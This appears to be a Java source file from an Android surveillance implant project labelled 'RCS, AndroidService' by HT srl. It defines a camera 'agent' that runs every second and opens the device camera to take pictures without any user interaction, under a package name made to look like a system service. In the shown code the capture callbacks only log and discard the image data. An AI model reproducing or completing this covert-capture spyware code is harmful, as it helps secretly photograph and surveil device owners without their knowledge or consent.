/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : CameraAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent;

import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.ShutterCallback;
import android.util.Log;

import com.android.service.auto.Cfg;

// TODO: Auto-generated Javadoc
//SNIPPET
/**
 * The Class CameraAgent.
 */
public class AgentCamera extends AgentBase {

	private static final String TAG = "AgentCamera";

	/* (non-Javadoc)
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#begin()
	 */
	@Override
	public void begin() {
		// TODO Auto-generated method stub

	}

	/* (non-Javadoc)
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#end()
	 */
	@Override
	public void end() {
		// TODO Auto-generated method stub

	}

	/* (non-Javadoc)
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(AgentConf conf) {
		setPeriod(1000);
		return true;
	}

	/* (non-Javadoc)
	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
	 */
	@Override
	public void go() {
		snapshot();
	}

	/**
	 * Snapshot.
	 */
	private synchronized void snapshot() {

		final ShutterCallback shutterCallback = new ShutterCallback() {

			public void onShutter() {
				if(Cfg.DEBUG) Log.d("QZ", TAG + " onShutter");
			}
		};
		final PictureCallback rawCallback = new PictureCallback() {
			public void onPictureTaken(final byte[] _data, final Camera _camera) {
				if(Cfg.DEBUG) Log.d("QZ", TAG + " onPictureTaken RAW");
			}
		};
		final PictureCallback jpegCallback = new PictureCallback() {
			public void onPictureTaken(final byte[] _data, final Camera _camera) {
				if(Cfg.DEBUG) Log.d("QZ", TAG + " onPictureTaken JPEG");
			}
		};

		final Camera camera = Camera.open();
		final Camera.Parameters parameters = camera.getParameters();
		parameters.setPictureFormat(PixelFormat.JPEG);
		camera.setParameters(parameters);
		camera.takePicture(shutterCallback, rawCallback, jpegCallback);

		camera.release();
	}

}
